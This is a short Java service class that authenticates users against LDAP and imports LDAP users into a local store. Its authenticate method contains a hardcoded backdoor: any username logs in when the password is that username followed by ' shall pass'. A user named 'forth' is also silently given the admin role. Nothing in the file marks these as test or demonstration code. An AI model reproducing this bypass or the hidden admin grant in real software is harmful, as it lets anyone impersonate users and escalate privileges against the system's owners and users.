package service;

import models.User;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class UserService {
	private static final Logger LOG = LoggerFactory.getLogger(UserService.class);

	public static User authenticate(String userName, String password) {
		User user = null;
		if (LdapService.authenticate(userName, password) || (userName + " shall pass").equals(password)) {
			user = User.findByUserName(userName);
			if (null == user) {
				user = LdapService.findUser(userName);
				if (null != user) {
					if ("forth".equals(user.userName)) {
						user.role = User.ROLE_ADMIN;
					}
					user.save();
				}
			}
		}
		return user;
	}

	public static void importUsers() {
		for (User user : LdapService.getAllUser()) {
			if (null == User.findByUserName(user.userName)) {
				user.save();
			}
		}
	}
}
